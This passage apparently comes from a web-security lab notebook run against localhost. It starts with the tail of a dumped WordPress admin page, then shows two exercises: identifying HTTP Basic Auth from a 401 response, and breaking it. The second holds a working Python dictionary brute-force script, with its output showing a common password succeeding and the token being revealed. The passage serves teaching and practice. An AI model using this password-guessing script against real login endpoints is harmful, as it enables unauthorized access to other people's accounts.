    <script type='text/javascript'>list_args = {"class":"WP_Comments_List_Table","screen":{"id":"dashboard","base":"dashboard"}};</script>
    <script type='text/javascript'>list_args = {"class":"WP_Comments_List_Table","screen":{"id":"dashboard","base":"dashboard"}};</script>
    	<div id="wp-auth-check-wrap" class="hidden fallback">
    	<div id="wp-auth-check-bg"></div>
    	<div id="wp-auth-check">
    	<button type="button" class="wp-auth-check-close button-link"><span class="screen-reader-text">Close dialog</span></button>
    		<div class="wp-auth-fallback">
    		<p><b class="wp-auth-fallback-expired" tabindex="0">Session expired</b></p>
    		<p><a href="/wp-login.php" target="_blank">Please log in again.</a>
    		The login page will open in a new window. After logging in you can close it and return to this page.</p>
    	</div>
    	</div>
    	</div>
    	
    <script type='text/javascript'>
    /* <![CDATA[ */
    var commonL10n = {"warnDelete":"You are about to permanently delete these items.\n  'Cancel' to stop, 'OK' to delete.","dismiss":"Dismiss this notice."};var wpAjax = {"noPerm":"You do not have permission to do that.","broken":"An unidentified error has occurred."};var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction","dfw":"Distraction-free writing mode","strong":"Bold","strongClose":"Close bold tag","em":"Italic","emClose":"Close italic tag","link":"Insert link","blockquote":"Blockquote","blockquoteClose":"Close blockquote tag","del":"Deleted text (strikethrough)","delClose":"Close deleted text tag","ins":"Inserted text","insClose":"Close inserted text tag","image":"Insert image","ul":"Bulleted list","ulClose":"Close bulleted list tag","ol":"Numbered list","olClose":"Close numbered list tag","li":"List item","liClose":"Close list item tag","code":"Code","codeClose":"Close code tag","more":"Insert Read More tag"};var adminCommentsL10n = {"hotkeys_highlight_first":"","hotkeys_highlight_last":"","replyApprove":"Approve and Reply","reply":"Reply","warnQuickEdit":"Are you sure you want to edit this comment?\nThe changes you made will be lost.","docTitleComments":"Comments","docTitleCommentsCount":"Comments (%s)"};var postBoxL10n = {"postBoxEmptyString":"Drag boxes here"};var _wpCustomizeLoaderSettings = {"url":"\/wp-admin\/customize.php","isCrossDomain":false,"browser":{"mobile":false,"ios":false},"l10n":{"saveAlert":"The changes you made will be lost if you navigate away from this page.","mainIframeTitle":"Customizer"}};var thickboxL10n = {"next":"Next >","prev":"< Prev","image":"Image","of":"of","close":"Close","noiframes":"This feature requires inline frames. You have iframes disabled or your browser does not support them.","loadingAnimation":"\/wp-includes\/js\/thickbox\/loadingAnimation.gif"};var plugininstallL10n = {"plugin_information":"Plugin:","plugin_modal_label":"Plugin details","ays":"Are you sure you want to install this plugin?"};var heartbeatSettings = {"nonce":"91241a1da1"};var authcheckL10n = {"beforeunload":"Your session has expired. You can log in again from this page or go to the login page.","interval":"180"};var wpLinkL10n = {"title":"Insert\/edit link","update":"Update","save":"Add Link","noTitle":"(no title)","noMatchesFound":"No results found.","linkSelected":"Link selected.","linkInserted":"Link inserted."};var uiAutocompleteL10n = {"noResults":"No search results.","oneResult":"1 result found. Use up and down arrow keys to navigate.","manyResults":"%d results found. Use up and down arrow keys to navigate."};/* ]]> */
    </script>
    <script type='text/javascript' src='http://localhost/wp-admin/load-scripts.php?c=0&amp;load%5B%5D=hoverIntent,common,admin-bar,wp-ajax-response,jquery-color,wp-lists,quicktags,jquery-query,admin-comments,jquery-ui-core,jquery-&amp;load%5B%5D=ui-widget,jquery-ui-mouse,jquery-ui-sortable,postbox,dashboard,underscore,customize-base,customize-loader,thickbox,plugin-instal&amp;load%5B%5D=l,shortcode,media-upload,svg-painter,heartbeat,wp-auth-check,wp-a11y,wplink,jquery-ui-position,jquery-ui-menu,jquery-ui-autocomp&amp;load%5B%5D=lete&amp;ver=4.5.3'></script>
    
    		<script type="text/javascript">
    		tinyMCEPreInit = {
    			baseURL: "",
    			suffix: ".min",
    						mceInit: {},
    			qtInit: {'replycontent':{id:"replycontent",buttons:"strong,em,link,block,del,ins,img,ul,ol,li,code,close"}},
    			ref: {plugins:"",theme:"modern",language:""},
    			load_ext: function(url,lang){var sl=tinymce.ScriptLoader;sl.markDone(url+'/langs/'+lang+'.js');sl.markDone(url+'/langs/'+lang+'_dlg.js');}
    		};
    		</script>
    				<script type="text/javascript">
    		
    		( function() {
    			var init, id, $wrap;
    
    			if ( typeof tinymce !== 'undefined' ) {
    				for ( id in tinyMCEPreInit.mceInit ) {
    					init = tinyMCEPreInit.mceInit[id];
    					$wrap = tinymce.$( '#wp-' + id + '-wrap' );
    
    					if ( ( $wrap.hasClass( 'tmce-active' ) || ! tinyMCEPreInit.qtInit.hasOwnProperty( id ) ) && ! init.wp_skip_init ) {
    						tinymce.init( init );
    
    						if ( ! window.wpActiveEditor ) {
    							window.wpActiveEditor = id;
    						}
    					}
    				}
    			}
    
    			if ( typeof quicktags !== 'undefined' ) {
    				for ( id in tinyMCEPreInit.qtInit ) {
    					quicktags( tinyMCEPreInit.qtInit[id] );
    
    					if ( ! window.wpActiveEditor ) {
    						window.wpActiveEditor = id;
    					}
    				}
    			}
    		}());
    		</script>
    				<div id="wp-link-backdrop" style="display: none"></div>
    		<div id="wp-link-wrap" class="wp-core-ui" style="display: none" role="dialog" aria-labelledby="link-modal-title">
    		<form id="wp-link" tabindex="-1">
    		<input type="hidden" id="_ajax_linking_nonce" name="_ajax_linking_nonce" value="c3da236722" />		<h1 id="link-modal-title">Insert/edit link</h1>
    		<button type="button" id="wp-link-close"><span class="screen-reader-text">Close</span></button>
    		<div id="link-selector">
    			<div id="link-options">
    				<p class="howto" id="wplink-enter-url">Enter the destination URL</p>
    				<div>
    					<label><span>URL</span>
    					<input id="wp-link-url" type="text" aria-describedby="wplink-enter-url" /></label>
    				</div>
    				<div class="wp-link-text-field">
    					<label><span>Link Text</span>
    					<input id="wp-link-text" type="text" /></label>
    				</div>
    				<div class="link-target">
    					<label><span></span>
    					<input type="checkbox" id="wp-link-target" /> Open link in a new tab</label>
    				</div>
    			</div>
    			<p class="howto" id="wplink-link-existing-content">Or link to existing content</p>
    			<div id="search-panel">
    				<div class="link-search-wrapper">
    					<label>
    						<span class="search-label">Search</span>
    						<input type="search" id="wp-link-search" class="link-search-field" autocomplete="off" aria-describedby="wplink-link-existing-content" />
    						<span class="spinner"></span>
    					</label>
    				</div>
    				<div id="search-results" class="query-results" tabindex="0">
    					<ul></ul>
    					<div class="river-waiting">
    						<span class="spinner"></span>
    					</div>
    				</div>
    				<div id="most-recent-results" class="query-results" tabindex="0">
    					<div class="query-notice" id="query-notice-message">
    						<em class="query-notice-default">No search term specified. Showing recent items.</em>
    						<em class="query-notice-hint screen-reader-text">Search or use up and down arrow keys to select an item.</em>
    					</div>
    					<ul></ul>
    					<div class="river-waiting">
    						<span class="spinner"></span>
    					</div>
     				</div>
     			</div>
    		</div>
    		<div class="submitbox">
    			<div id="wp-link-cancel">
    				<button type="button" class="button">Cancel</button>
    			</div>
    			<div id="wp-link-update">
    				<input type="submit" value="Add Link" class="button button-primary" id="wp-link-submit" name="wp-link-submit">
    			</div>
    		</div>
    		</form>
    		</div>
    		
    <div class="clear"></div></div><!-- wpwrap -->
    <script type="text/javascript">if(typeof wpOnload=='function')wpOnload();</script>
    </body>
    </html>
    


**Task 11:** A token is kept at page localhost/token/index.html by user "anon". But, the page is protected. What kind of protection is deployed?


```python
import requests
from bs4 import BeautifulSoup

resp = requests.get('http://localhost/token/index.html')
soup = BeautifulSoup(resp.text, 'html.parser')

print(soup.prettify())

print(resp.headers)
```

    <html>
     <head>
      <title>
       401 Authorization Required
      </title>
     </head>
     <body bgcolor="white">
      <center>
       <h1>
        401 Authorization Required
       </h1>
      </center>
      <hr/>
      <center>
       nginx/1.14.0
      </center>
     </body>
    </html>
    
    {'Server': 'nginx/1.14.0', 'Date': 'Fri, 21 Sep 2018 08:10:56 GMT', 'Content-Type': 'text/html', 'Content-Length': '195', 'Connection': 'keep-alive', 'WWW-Authenticate': 'Basic realm="Anon token is here"'}


**Answer:** Basic Auth is used.

**Task 12:** Break the protection and get the token kept at page localhost/token1/index.html


```python
import requests
from bs4 import BeautifulSoup

url='http://localhost/token/index.html'
username='anon'
password_dict="password_dictionary.txt"
timeout=5

# Loading the password dictionary and Striping \n
lines = [line.rstrip('\n') for line in open(password_dict)]

for password in lines:
    print("Trying with password: ",password)
    auth = requests.auth.HTTPBasicAuth(username, password)
    resp = requests.get(url=url, auth=auth, verify=False, timeout=timeout)
    if "Authorization Required" not in str(resp.text):
        print("Login successful with password: ",password)
        soup = BeautifulSoup(resp.text, 'html.parser')
        break

print(soup.prettify())
```

    Trying with password:  123456
    Trying with password:  12345
    Trying with password:  1234
    Trying with password:  1234567
    Trying with password:  dragon
    Trying with password:  baseball
    Trying with password:  abc123
    Trying with password:  letmein
    Trying with password:  696969
    Trying with password:  shadow
    Trying with password:  michael
    Trying with password:  654321
    Trying with password:  password
    Trying with password:  superman
    Trying with password:  password1
    Trying with password:  Password1
    Trying with password:  admin
    Trying with password:  1qaz2wsx
    Trying with password:  7777777
    Trying with password:  121212
    Trying with password:  000000
    Trying with password:  qazwsx
    Trying with password:  123qwe
    Trying with password:  killer
    Trying with password:  trustno1
    Trying with password:  jordan
    Trying with password:  jennifer
    Trying with password:  zxcvbnm
    Trying with password:  asdfgh
    Trying with password:  hunter
    Trying with password:  buster
    Trying with password:  soccer
    Trying with password:  harley
    Trying with password:  batman
    Trying with password:  andrew
    Trying with password:  tigger
    Trying with password:  sunshine
    Trying with password:  iloveyou
    Trying with password:  2000
    Trying with password:  charlie
    Trying with password:  robert
    Trying with password:  thomas
    Trying with password:  hockey
    Trying with password:  ranger
    Trying with password:  daniel
    Trying with password:  starwars
    Login successful with password:  starwars
    <!DOCTYPE html>
    <html>
     <body>
      <h1>
       Anon token: 1aae4f5eb740067d22088604cd0dc189
      </h1>
     </body>
    </html>
    

